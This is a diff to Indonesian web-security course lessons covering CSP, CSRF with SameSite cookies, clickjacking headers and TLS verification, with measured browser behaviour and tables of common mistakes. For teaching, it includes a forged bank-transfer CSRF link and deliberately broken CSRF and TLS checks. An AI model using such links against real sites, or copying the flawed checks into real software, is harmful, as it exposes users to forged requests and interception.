+            'Menganggap CSP menggantikan encoding output',
+            'Skrip jahat kan diblokir',
+            'CSP membatasi kerusakan, bukan mencegah penyisipan. Encoding tetap pertahanan utama',
+          ],
+          [
+            'Lupa bahwa `style-src` ikut memblokir atribut `style`',
+            'Yang dibatasi kan berkas CSS',
+            'Diukur, latar yang ditulis di atribut `style` menjadi transparan sepenuhnya',
+          ],
+          [
+            'Memakai nonce pada halaman yang di-cache statis',
+            'Nonce kan selalu dibuat baru',
+            'HTML lama disajikan dengan nonce lama sementara headernya baru. Gagalnya berubah-ubah',
+          ],
+          [
+            'Menulis CSP tanpa `object-src`, `base-uri`, `form-action`',
+            'Yang penting `script-src`',
+            'Ketiganya menutup pengambilalihan tautan relatif, pengiriman formulir ke server lain, dan plugin lama',
+          ],
+        ],
+      ),
+      p(
+        'Cara paling jujur menilai sebuah CSP adalah membayangkan satu skrip penyerang sudah berjalan di halamanmu, lalu bertanya ke mana ia bisa mengirim data yang sudah ia kumpulkan. Bila `connect-src` masih berisi `*` atau tidak ditulis sama sekali, jawabannya adalah ke mana saja, dan seluruh sisa kebijakannya tidak banyak menolong.',
+      ),
       references(
         {
           label: 'Content Security Policy (CSP)',
@@ -1304,7 +2027,7 @@ export const lessons: LessonDraft[] = [
   written(
     'csrf-cookie',
     'CSRF dan Cookie yang Aman',
-    13,
+    19,
     'Situs lain memakai sesimu tanpa pernah membaca satu byte pun datamu.',
     [
       p(
@@ -1560,6 +2283,213 @@ export const lessons: LessonDraft[] = [
         'Lewati semua ini untuk API murni header, dan catat alasannya agar tidak dipertanyakan berulang.',
       ),
 
+      h2('Studi kasus di project nyata'),
+      p(
+        'CSRF bekerja karena peramban menyertakan cookie **secara otomatis** ke situs pemiliknya, tanpa peduli halaman mana yang memicu permintaannya. Yang menentukan seberapa besar celahnya adalah atribut `SameSite`, dan batas yang ditariknya bisa diukur persis.',
+      ),
+      code(
+        'text',
+        `
+        Diukur sungguhan di Chrome 149. Pengguna login di 127.0.0.1:4001,
+        lalu membuka halaman penyerang di localhost:4002 yang mencoba
+        empat cara sekaligus.
+
+        SameSite=Lax
+          img GET lintas situs        cookie=TIDAK ADA
+          fetch credentials:include   cookie=TIDAK ADA
+          form POST lintas situs      cookie=TIDAK ADA
+          navigasi GET teratas        cookie=sesi=abc123     <- SATU-SATUNYA
+
+        SameSite=Strict
+          keempatnya                  cookie=TIDAK ADA
+
+        SameSite=None (tanpa Secure, di atas http)
+          keempatnya                  cookie=TIDAK ADA
+          -> cookienya bahkan TIDAK PERNAH TERPASANG. Chrome menolaknya.
+        `,
+        {
+          caption:
+            'Lax adalah bawaan Chrome modern, dan ia sudah menutup CSRF lewat form POST lintas situs.',
+        },
+      ),
+      p(
+        'Hasil itu mengubah cara memahami CSRF dibanding tutorial lama. Serangan klasik berupa formulir tersembunyi yang mengirim `POST` sudah tidak bekerja pada cookie ber-`SameSite=Lax`, dan itu berarti **cookie bawaan peramban hari ini sudah menutup bentuk yang paling sering diajarkan**.',
+      ),
+      p(
+        'Yang **tidak** tertutup adalah baris terakhir tabel, yaitu navigasi teratas. Bila ada endpoint yang mengubah keadaan lewat `GET`, satu tautan sudah cukup.',
+      ),
+      code(
+        'text',
+        `
+        Yang masih bisa dilakukan penyerang dengan SameSite=Lax:
+
+          <a href="https://bank.contoh.id/transfer?ke=penyerang&jumlah=10000000">
+            Klik untuk hadiahmu
+          </a>
+
+        Cookie sesi IKUT terkirim, sebab ini navigasi teratas.
+
+        Karena itu aturannya bukan soal CSRF token melainkan soal metode:
+          GET  tidak boleh pernah mengubah keadaan
+          POST, PATCH, PUT, DELETE untuk yang mengubah
+        `,
+      ),
+      p(
+        'Untuk API yang memang memakai cookie dan perlu lapisan kedua, bentuknya adalah token anti-CSRF, dan pola kirim-ganda adalah yang paling sederhana karena tidak memerlukan penyimpanan di server.',
+      ),
+      code(
+        'ts',
+        `
+        // Saat sesi dibuat: dua cookie sekaligus.
+        const csrf = crypto.randomBytes(32).toString('base64url');
+        res.setHeader('Set-Cookie', [
+          // Sesi: tidak bisa dibaca JavaScript.
+          \`sesi=\${idSesi}; HttpOnly; Secure; SameSite=Lax; Path=/\`,
+          // Token CSRF: SENGAJA bisa dibaca JavaScript, supaya bisa
+          // disalin ke header. Nilainya bukan rahasia sesi.
+          \`csrf=\${csrf}; Secure; SameSite=Lax; Path=/\`,
+        ]);
+
+        // Di setiap permintaan yang mengubah keadaan:
+        function periksaCsrf(req: Request) {
+          const dariCookie = bacaCookie(req, 'csrf');
+          const dariHeader = req.headers.get('X-CSRF-Token');
+          if (!dariCookie || !dariHeader) return false;
+          // Situs lain BISA membuat permintaan, dan TIDAK BISA membaca
+          // cookie-mu untuk menyalin nilainya ke header.
+          return crypto.timingSafeEqual(
+            crypto.createHash('sha256').update(dariCookie).digest(),
+            crypto.createHash('sha256').update(dariHeader).digest(),
+          );
+        }
+        `,
+        {
+          caption:
+            'Yang membuatnya bekerja: same-origin policy melarang situs lain membaca cookie domainmu.',
+        },
+      ),
+      p(
+        'Untuk API yang autentikasinya memakai header `Authorization` tanpa cookie sama sekali, CSRF tidak berlaku. Tidak ada kredensial yang dikirim otomatis, jadi tidak ada yang bisa ditumpangi. Memasang mesin token CSRF di API seperti itu menambah kerumitan tanpa menutup apa pun.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Kesalahan konfigurasi cookie punya gejala yang sangat khas, dan yang paling sering adalah cookie yang seolah tidak pernah terpasang.',
+      ),
+      code(
+        'text',
+        `
+        1. SameSite=None tanpa Secure
+
+           Diukur: cookienya TIDAK PERNAH terpasang di Chrome 149.
+           Konsol peramban:
+             This attempt to set a cookie via a Set-Cookie header was
+             blocked because it had the "SameSite=None" attribute but
+             did not have the "Secure" attribute.
+
+           Gejala di aplikasi: pengguna login, halaman berikutnya
+           menolaknya dengan 401, dan tidak ada error di server.
+
+        2. Secure di atas http://
+
+           Cookie Secure tidak dipasang di koneksi tanpa TLS, KECUALI
+           di localhost yang diperlakukan khusus. Karena itu masalah
+           ini sering baru muncul di staging, tidak pernah di laptop.
+
+        3. Domain atau Path tidak cocok
+
+           Set-Cookie: sesi=...; Domain=app.contoh.id
+           lalu dibaca dari api.contoh.id -> tidak ikut terkirim.
+        `,
+      ),
+      p(
+        'Kelas kedua adalah token CSRF yang terpasang tapi tidak menutup apa pun, dan ini yang paling berbahaya karena semuanya tampak bekerja.',
+      ),
+      code(
+        'ts',
+        `
+        // TIDAK MENUTUP APA PUN — tokennya dibandingkan dengan dirinya sendiri.
+        const dariBadan = req.body.csrf;
+        const dariCookie = bacaCookie(req, 'csrf');
+        if (dariBadan === dariCookie) lanjut();
+        // Penyerang mengirim formulir dengan field csrf berisi apa saja,
+        // dan cookienya... juga ikut otomatis. Keduanya tidak pernah
+        // sama, jadi ini kebetulan MENUTUP. Tapi versi berikutnya tidak:
+
+        // BENAR-BENAR TIDAK MENUTUP:
+        if (req.headers['x-csrf-token'] === req.body.csrf) lanjut();
+        // Keduanya dikendalikan penyerang. Selalu cocok.
+
+        // Dan yang ini menutup pemeriksaannya sendiri:
+        if (req.method === 'GET') lanjut();   // tanpa periksa apa pun
+        // ...lalu ada endpoint GET yang mengubah keadaan.
+        `,
+      ),
+      p(
+        'Pemeriksaan `Origin` adalah pengganti yang jauh lebih murah dan hampir selalu cukup untuk API modern.',
+      ),
+      code(
+        'ts',
+        `
+        const ORIGIN_SENDIRI = new Set(['https://app.contoh.id']);
+
+        function berasalDariSendiri(req: Request) {
+          const origin = req.headers.get('Origin');
+          // Header Origin DIKIRIM peramban pada semua permintaan yang
+          // mengubah keadaan, dan TIDAK BISA dipalsukan oleh JavaScript.
+          if (origin) return ORIGIN_SENDIRI.has(origin);
+          // Tidak ada Origin sama sekali: tolak untuk metode yang mengubah.
+          return false;
+        }
+        `,
+        {
+          caption:
+            'Diukur di sub-bab clickjacking: form POST lintas situs tiba dengan Origin http://127.0.0.1:3998 yang jelas berbeda.',
+        },
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Materi CSRF di internet sebagian besar ditulis sebelum `SameSite` menjadi bawaan, dan itu membuat sebagian sarannya kini menyelesaikan masalah yang berbeda dari yang dikira.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Membuat endpoint `GET` yang mengubah keadaan',
+            'Lebih gampang ditaruh di tautan',
+            'Diukur, navigasi teratas lintas situs TETAP membawa cookie meski `SameSite=Lax`. Satu tautan cukup',
+          ],
+          [
+            'Memasang token CSRF pada API bearer tanpa cookie',
+            'Katanya semua API butuh CSRF',
+            'Tanpa kredensial otomatis, tidak ada yang bisa ditumpangi. Kerumitan tanpa manfaat',
+          ],
+          [
+            'Membandingkan dua nilai yang sama-sama dari klien',
+            'Kan dicocokkan',
+            'Keduanya dikendalikan penyerang dan selalu cocok. Satu sisi harus berupa cookie yang tidak bisa ia baca',
+          ],
+          [
+            'Memakai `SameSite=None` supaya frontend beda domain jalan',
+            'Biar cookienya terkirim',
+            'Diukur, tanpa `Secure` cookienya tidak pernah terpasang sama sekali. Dan `None` membuka kembali CSRF',
+          ],
+          [
+            'Menyimpan token sesi di `localStorage` agar bebas CSRF',
+            'Tidak ada cookie, tidak ada CSRF',
+            'Benar untuk CSRF, dan membuka XSS: skrip apa pun bisa membacanya. Cookie `HttpOnly` lebih aman',
+          ],
+          [
+            'Melewati pemeriksaan untuk metode `GET`',
+            '`GET` kan tidak mengubah apa-apa',
+            'Itu benar hanya bila tidak ada satu pun endpoint `GET` yang mengubah keadaan. Pastikan dulu',
+          ],
+        ],
+      ),
+      p(
+        'Baris kelima adalah pertukaran yang paling sering salah dinilai. Memindahkan token dari cookie ke `localStorage` memang menghilangkan CSRF, dan sekaligus menghapus satu-satunya perlindungan yang bekerja ketika XSS terjadi. Cookie `HttpOnly` yang dipasangkan dengan `SameSite=Lax` dan pemeriksaan `Origin` menutup kedua sisi sekaligus, dan itulah sebabnya ia tetap menjadi pilihan bawaan untuk aplikasi web yang dibuka di peramban.',
+      ),
       references(
         {
           label: 'Cross-site request forgery (CSRF)',
@@ -1592,7 +2522,7 @@ export const lessons: LessonDraft[] = [
   written(
     'clickjacking-header',
     'Clickjacking dan Header Keamanan',
-    12,
+    18,
     'Beberapa baris header yang menutup seluruh kelas serangan sekaligus.',
     [
       p(
@@ -1798,6 +2728,194 @@ export const lessons: LessonDraft[] = [
         'Tidak ada logika aplikasi yang berubah, tidak ada query yang perlu ditulis ulang, dan waktunya kurang dari satu jam. Pasang sejak awal proyek, lalu verifikasi dengan `curl -I` setiap kali menambah proxy atau CDN di depan aplikasi.',
       ),
 
+      h2('Studi kasus di project nyata'),
+      p(
+        'Clickjacking bekerja dengan cara yang berbeda dari serangan lain di bab ini. Tidak ada kode yang disuntikkan dan tidak ada permintaan yang dipalsukan. Yang dilakukan penyerang hanyalah memuat halamanmu di dalam bingkai, menutupinya dengan lapisan miliknya, dan membiarkan pengguna mengklik tombolmu tanpa tahu.',
+      ),
+      p('Pertahanannya satu baris, dan efeknya bisa dilihat langsung di peramban.'),
+      code(
+        'text',
+        `
+        Diukur sungguhan di Chrome 149. Halaman penyerang memuat dua
+        iframe ke situs korban, satu tanpa proteksi dan satu dengan.
+
+        Konsol peramban:
+          Framing 'http://127.0.0.1:3997/' violates the following
+          Content Security Policy directive: "frame-ancestors 'none'".
+          The request has been blocked.
+
+        Dan header yang menghasilkannya:
+          Content-Security-Policy: frame-ancestors 'none'
+          X-Frame-Options: DENY
+        `,
+        {
+          caption:
+            'Halaman yang tidak diproteksi dimuat tanpa keluhan apa pun. Hanya yang kedua yang diblokir.',
+        },
+      ),
+      p('Dua header itu tidak setara, dan mengetahui bedanya menentukan mana yang perlu ditulis.'),
+      table(
+        ['', '`X-Frame-Options`', '`frame-ancestors`'],
+        [
+          [
+            'Statusnya',
+            'Header lama, tidak pernah menjadi standar resmi',
+            'Bagian dari CSP Level 2, standar resmi',
+          ],
+          [
+            'Nilai yang ada',
+            '`DENY` atau `SAMEORIGIN` saja',
+            'Daftar origin, jadi beberapa mitra bisa diizinkan sekaligus',
+          ],
+          [
+            '`ALLOW-FROM`',
+            'Tidak didukung peramban modern mana pun',
+            'Digantikan daftar origin yang memang bekerja',
+          ],
+          ['Bila keduanya ada', 'Diabaikan peramban modern', '`frame-ancestors` yang menang'],
+          [
+            'Kapan tetap dipasang',
+            'Untuk peramban sangat lama',
+            'Ini yang utama. Tulis keduanya, dengan nilai yang konsisten',
+          ],
+        ],
+      ),
+      p(
+        'Untuk halaman yang memang perlu dibingkai mitra tertentu, bentuknya adalah daftar origin, bukan mematikan proteksinya.',
+      ),
+      code(
+        'text',
+        `
+        Content-Security-Policy: frame-ancestors 'self' https://mitra.contoh.id
+
+        Dan JANGAN memakai wildcard di sini:
+          frame-ancestors *           <- sama dengan tidak ada proteksi
+          frame-ancestors https://*   <- setiap situs https mana pun
+        `,
+      ),
+      p(
+        'Sisi lain dari bab ini adalah kumpulan header yang sering dipasang bersamaan, dan masing-masing menutup hal yang berbeda.',
+      ),
+      code(
+        'text',
+        `
+        Diukur pada respons yang benar-benar dikirim (bab Keamanan Backend):
+
+          content-security-policy: default-src 'self'; frame-ancestors 'none'
+          strict-transport-security: max-age=31536000; includeSubDomains
+          x-content-type-options: nosniff
+          referrer-policy: strict-origin-when-cross-origin
+          permissions-policy: geolocation=(), camera=(), microphone=()
+        `,
+      ),
+      p(
+        '`Referrer-Policy` pantas dijelaskan sendiri karena akibatnya paling sering tidak disadari. Tanpa kebijakan, URL halaman asal ikut terkirim ke setiap situs yang ditautkan, dan URL itu sering mengandung id pesanan, kata pencarian, atau bahkan token setel-ulang sandi.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Proteksi pembingkaian punya satu efek samping yang hampir selalu ditemukan setelah dipasang, yaitu integrasi sah yang ikut mati.',
+      ),
+      code(
+        'text',
+        `
+        Gejalanya bingkai putih kosong, dan pesannya HANYA di konsol
+        peramban halaman induk:
+
+          Refused to display 'https://app.contoh.id/' in a frame because
+          it set 'X-Frame-Options' to 'deny'.
+
+          Refused to frame 'https://app.contoh.id/' because an ancestor
+          violates the following Content Security Policy directive:
+          "frame-ancestors 'none'".
+
+        Yang biasanya ikut mati:
+          - pratinjau halaman di dalam CMS sendiri
+          - widget pembayaran yang membingkai halaman konfirmasi
+          - alat pengujian dan perekam sesi
+          - dokumentasi yang menampilkan demo langsung
+        `,
+        {
+          caption:
+            'Perbaikannya bukan mematikan header, melainkan mendaftar origin yang memang berhak membingkai.',
+        },
+      ),
+      p(
+        'Kesalahan kedua bersifat mekanis, yaitu header yang dipasang di tempat yang tidak dilalui semua respons.',
+      ),
+      code(
+        'text',
+        `
+        Diperiksa dengan curl pada beberapa rute sekaligus:
+
+          curl -sI https://app.contoh.id/            | grep -i frame
+          curl -sI https://app.contoh.id/api/produk  | grep -i frame
+          curl -sI https://app.contoh.id/tidak-ada   | grep -i frame
+          curl -sI https://app.contoh.id/_next/image | grep -i frame
+
+        Yang paling sering kosong adalah baris KETIGA. Halaman 404 dan
+        halaman error sering disajikan oleh jalur yang berbeda dan tidak
+        melewati middleware yang memasang headernya.
+        `,
+      ),
+      p(
+        'Dan ada satu kesalahan yang membuat proteksi terlihat terpasang padahal tidak, yaitu nilai yang saling bertentangan antara dua header.',
+      ),
+      code(
+        'text',
+        `
+        X-Frame-Options: SAMEORIGIN
+        Content-Security-Policy: frame-ancestors *
+
+        Peramban modern mengabaikan X-Frame-Options ketika
+        frame-ancestors ada, jadi yang berlaku adalah yang PERMISIF.
+        Halamannya bisa dibingkai siapa saja, dan pemindai keamanan
+        sederhana tetap melaporkan "X-Frame-Options terpasang".
+        `,
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Header keamanan mudah disalin dari internet, dan kesalahannya hampir selalu berupa menyalin tanpa memastikan ia benar-benar sampai ke respons yang dilihat pengguna.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Hanya memasang `X-Frame-Options`',
+            'Itu yang paling sering disebut',
+            'Ia tidak pernah jadi standar dan diabaikan saat `frame-ancestors` ada. Tulis keduanya',
+          ],
+          [
+            'Memakai `ALLOW-FROM` untuk mengizinkan mitra',
+            'Ada di dokumentasi lama',
+            'Tidak didukung peramban modern mana pun. Pakai `frame-ancestors` dengan daftar origin',
+          ],
+          [
+            'Mematikan proteksi saat pratinjau CMS ikut mati',
+            'Integrasinya kan sah',
+            'Daftar origin-nya, jangan matikan. Satu origin diizinkan tidak sama dengan semua diizinkan',
+          ],
+          [
+            'Memasang header hanya di rute utama',
+            'Middleware kan global',
+            'Diperiksa dengan `curl`, halaman 404 dan aset statis sering melewati jalur berbeda',
+          ],
+          [
+            'Menulis dua header dengan nilai bertentangan',
+            'Dua lapisan lebih aman',
+            'Yang permisif yang menang. Pemindai tetap melaporkannya terpasang, dan proteksinya tidak ada',
+          ],
+          [
+            'Melewatkan `Referrer-Policy`',
+            'Cuma soal statistik kunjungan',
+            'URL berisi token atau id pesanan ikut terkirim ke setiap situs yang ditautkan halamanmu',
+          ],
+        ],
+      ),
+      p(
+        'Cara memeriksanya tidak memerlukan alat khusus. Jalankan `curl -sI` pada empat rute yang berbeda, yaitu halaman utama, satu endpoint API, satu halaman yang sengaja tidak ada, dan satu aset statis, lalu bandingkan keluarannya. Header yang hanya muncul di satu dari empat rute adalah header yang tidak benar-benar terpasang, betapapun rapi konfigurasinya terbaca di kode.',
+      ),
       references(
         {
           label: 'Clickjacking Defense Cheat Sheet',
@@ -1836,7 +2954,7 @@ export const lessons: LessonDraft[] = [
   written(
     'tls-setiap-hop',
     'TLS di Setiap Hop',
-    12,
+    19,
     'Gembok di address bar hanya menjaga satu ruas perjalanan.',
     [
       p(
@@ -2009,6 +3127,192 @@ export const lessons: LessonDraft[] = [
         'Pantau tanggal kedaluwarsa sertifikat, karena perpanjangan yang terlambat mendorong orang mengambil jalan pintas berbahaya.',
       ),
 
+      h2('Studi kasus di project nyata'),
+      p(
+        'Kalimat "kami sudah memakai HTTPS" hampir selalu berarti satu hop saja terenkripsi, yaitu antara peramban dan penyeimbang beban terdepan. Hop sesudahnya, yaitu ke aplikasi, ke basis data, dan ke layanan internal, sering masih polos.',
+      ),
+      p(
+        'Alasan hop internal sering tidak dienkripsi biasanya bukan keputusan melainkan kebiasaan, dan bentuknya sangat khas.',
+      ),
+      code(
+        'text',
+        `
+        Diuji sungguhan dengan Node 26.5.0 dan sertifikat self-signed.
+
+        A. Klien memverifikasi sertifikat (perilaku BAWAAN)
+           DITOLAK: TypeError
+           cause : DEPTH_ZERO_SELF_SIGNED_CERT - self-signed certificate;
+                   if the root CA is installed locally, try running
+                   Node.js with --use-system-ca
+
+        B. Verifikasi dimatikan — "biar cepat jalan"
+           BERHASIL: {"rahasia":"data-internal"}
+           -> terenkripsi, dan TIDAK ADA yang memastikan lawan bicaranya benar.
+        `,
+        {
+          caption:
+            'Langkah B adalah jalan pintas yang paling sering diambil, dan ia membuang separuh manfaat TLS.',
+        },
+      ),
+      p(
+        'Yang hilang di langkah B adalah **autentikasi server**. Koneksinya tetap terenkripsi, dan siapa pun yang bisa menyisipkan diri di jalur jaringan dapat menyajikan sertifikatnya sendiri dan tetap diterima. Enkripsi tanpa verifikasi identitas hanya melindungi dari penyadap pasif, bukan dari penyerang yang berada di tengah.',
+      ),
+      code(
+        'text',
+        `
+        C. Cara yang benar: percayai CA internalnya secara EKSPLISIT
+           BERHASIL: {"rahasia":"data-internal"}
+           -> terenkripsi DAN identitas lawan bicaranya terbukti.
+
+        D. Sertifikat yang benar untuk NAMA yang salah
+           DITOLAK: ERR_TLS_CERT_ALTNAME_INVALID
+           pesan : Hostname/IP does not match certificate's altnames:
+                   Host: layanan-lain. is not in the cert's altnames:
+                   DNS:layanan-internal, IP Address:127.0.0.1
+
+        E. Apa yang benar-benar dipakai koneksinya
+           protokol : TLSv1.3
+           cipher   : TLS_AES_256_GCM_SHA384
+           subjek   : layanan-internal | berlaku sampai: Sep 15 ... GMT
+        `,
+      ),
+      p(
+        'Langkah D adalah bagian yang paling sering disalahpahami. Pemeriksaan sertifikat bukan sekadar memastikan sertifikatnya sah, melainkan memastikan sertifikat itu memang diterbitkan untuk **nama yang sedang kamu hubungi**. Tanpa pemeriksaan nama, sertifikat sah milik siapa pun bisa dipakai untuk menyamar.',
+      ),
+      code(
+        'ts',
+        `
+        // Bentuk yang benar untuk layanan internal: percayai CA internalmu
+        // sendiri, bukan mematikan verifikasi.
+        const agen = new https.Agent({
+          ca: fs.readFileSync('/etc/ssl/ca-internal.pem'),   // HANYA CA ini
+          minVersion: 'TLSv1.2',
+          // servername dipakai untuk pemeriksaan nama DAN untuk SNI
+          servername: 'layanan-billing.internal',
+        });
+
+        // Untuk basis data, bentuknya sama, hanya namanya berbeda:
+        //   PostgreSQL : sslmode=verify-full  (BUKAN require)
+        //   MySQL      : ssl-mode=VERIFY_IDENTITY
+        //
+        // sslmode=require HANYA mengenkripsi. Ia TIDAK memeriksa
+        // sertifikat maupun nama host — persis seperti langkah B di atas.
+        `,
+        {
+          caption:
+            'Selisih antara require dan verify-full persis selisih antara langkah B dan langkah C.',
+        },
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Error TLS terlihat menakutkan dan sebenarnya sangat informatif, sebab masing-masing menyebut persis apa yang tidak cocok.',
+      ),
+      code(
+        'text',
+        `
+        DEPTH_ZERO_SELF_SIGNED_CERT
+          Sertifikatnya menandatangani dirinya sendiri. Wajar untuk
+          layanan internal — solusinya mendaftarkan CA-nya, bukan
+          mematikan verifikasi.
+
+        UNABLE_TO_VERIFY_LEAF_SIGNATURE
+          Rantai sertifikatnya tidak lengkap. Server lupa mengirim
+          sertifikat perantara. Ini kesalahan SERVER, bukan klien.
+
+        ERR_TLS_CERT_ALTNAME_INVALID
+          Sertifikatnya sah, namanya tidak cocok. Sering terjadi saat
+          menghubungi lewat alamat IP sementara sertifikatnya untuk nama.
+
+        CERT_HAS_EXPIRED
+          Paling sering menyebabkan insiden, dan paling mudah dicegah
+          dengan pemantauan tanggal kedaluwarsa.
+
+        ERR_SSL_PROTOCOL_ERROR / EPROTO
+          Sering berarti kamu berbicara https ke port yang melayani http,
+          atau versi TLS-nya tidak beririsan.
+        `,
+      ),
+      p(
+        'Yang jauh lebih berbahaya adalah kesalahan yang **tidak** menghasilkan error, dan di aplikasi web bentuknya sangat spesifik.',
+      ),
+      code(
+        'text',
+        `
+        1. Aplikasi di belakang proxy salah membaca protokol
+
+           Peramban -> HTTPS -> proxy -> HTTP -> aplikasi
+
+           Aplikasi melihat req.protocol === 'http', lalu:
+             - cookie Secure TIDAK dipasang
+             - pengalihan dibuat ke http://
+             - URL absolut di surel memakai http://
+
+           Menutupnya: percayai X-Forwarded-Proto dari proxy yang memang
+           milikmu (di Express: app.set('trust proxy', 1)), dan JANGAN
+           mempercayainya bila permintaannya bisa datang langsung.
+
+        2. HSTS tanpa masa berlaku yang memadai
+
+           Strict-Transport-Security: max-age=300
+
+           Lima menit berarti perlindungannya habis sebelum kunjungan
+           berikutnya. Nilai yang berarti dimulai dari 31536000 (satu tahun).
+
+        3. Konten campuran
+
+           Halaman https memuat gambar atau skrip lewat http://
+           Konsol: Mixed Content: The page at 'https://...' was loaded
+           over HTTPS, but requested an insecure resource. This request
+           has been blocked.
+        `,
+      ),
+      p(
+        'Kesalahan nomor satu pantas ditegaskan karena ia menghasilkan gejala yang membingungkan, yaitu pengguna yang terus-menerus keluar dari sesinya. Cookie `Secure` tidak pernah terpasang, sesinya tidak pernah bertahan, dan tidak ada satu pun baris error di log aplikasi.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'TLS adalah area tempat jalan pintas terasa paling tidak berbahaya, sebab setelah dipakai semuanya berjalan lancar.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Memakai `rejectUnauthorized: false`',
+            'Errornya hilang dan koneksinya jalan',
+            'Diukur, koneksinya berhasil dan tidak ada yang memastikan lawan bicaranya benar. Daftarkan CA-nya',
+          ],
+          [
+            'Memakai `sslmode=require` untuk basis data',
+            'Namanya saja sudah "require"',
+            'Ia hanya mengenkripsi. Tidak memeriksa sertifikat maupun nama host. Pakai `verify-full`',
+          ],
+          [
+            'Menganggap hop internal tidak perlu TLS',
+            'Kan di dalam jaringan sendiri',
+            'Posisi jaringan bukan otorisasi. Satu pod yang dikuasai penyerang bisa menyadap seluruh lalu lintas',
+          ],
+          [
+            'Tidak mempercayai `X-Forwarded-Proto` dari proxy sendiri',
+            'Header dari klien kan tidak boleh dipercaya',
+            'Aplikasinya mengira koneksinya `http`, cookie `Secure` tidak pernah terpasang, dan sesi terus hilang',
+          ],
+          [
+            'Memasang HSTS dengan `max-age` kecil',
+            'Biar aman kalau perlu dibatalkan',
+            'Perlindungannya habis sebelum kunjungan berikutnya. Uji dengan nilai kecil, lalu naikkan ke satu tahun',
+          ],
+          [
+            'Membiarkan sertifikat kedaluwarsa tanpa pemantauan',
+            'Pembaruannya kan otomatis',
+            '`CERT_HAS_EXPIRED` adalah penyebab insiden yang paling sering, dan paling mudah dicegah dengan alarm tanggal',
+          ],
+        ],
+      ),
+      p(
+        'Satu pemeriksaan sederhana menutup sebagian besar baris di tabel itu. Jalankan `openssl s_client -connect host:port -servername nama` terhadap setiap hop yang dipakai aplikasimu, termasuk basis data dan layanan internal, lalu baca tanggal kedaluwarsa, rantai sertifikat, dan nama yang tercantum di dalamnya. Hop yang tidak bisa diperiksa dengan perintah itu biasanya adalah hop yang memang belum dienkripsi.',
+      ),
       references(
         {
           label: 'Strict-Transport-Security',
